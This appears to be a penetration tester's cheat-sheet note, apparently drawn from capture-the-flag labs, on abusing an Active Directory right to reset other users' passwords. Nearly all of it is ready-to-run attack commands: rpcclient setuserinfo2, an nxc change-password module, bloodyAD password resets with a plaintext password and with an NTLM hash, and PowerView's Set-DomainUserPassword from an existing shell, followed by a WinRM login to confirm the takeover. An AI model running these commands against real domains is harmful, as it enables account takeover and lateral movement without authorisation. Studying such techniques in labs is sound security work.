
Domain policy which allows changing the password of an user.

---

###### Remotely

1. Connect to RPC

```
rpcclient -U "" <target_ip>
```

2. Change Password

```
setuserinfo2 <ziel-benutzername> 23 <neues-passwort> 
```

Could also be possible with this nxc module.

```
nxc smb baby.vl -u caroline.robinson -p passwords.txt -M change-password -o NEWPASS=Warrior32
```

or with bloodyad

```
bloodyad --host 10.129.41.20 -d puppy.htb -u ant.edwards -p 'Antman2025!' set password 'adam.silver' 'Password123!'
```

NTLM Auth

```
bloodyad -u PNT-SVRBPA$ -p :2dfcebbe9f5f4cb3bf98032887b3d7b6 -d painters.htb --host dc.painters.htb set password blake 'Pass123!'
```

---
##### Internally Windows Abuse

Since RPC or anything else we need to use for this ACL is blocked by firewall, we need to utilize PowerShell ACL Abuse via PowerView.ps1's "Set-DomainUserPassword" function.

```
upload /opt/tools/PowerView.ps1
. .\PowerView.ps1
```

As I already have a shell as oliver, I don’t need to pass that credential. I’ll just create a password and change it:

```
$newpass = ConvertTo-SecureString "password123!" -AsPlainText -Force
```

Changed password of user "smith".

```
Set-DomainUserPassword -Identity smith -AccountPassword $newpass
```

Verified that it worked.

```
nxc winrm 10.129.63.128 -u smith -p 'password123!'
```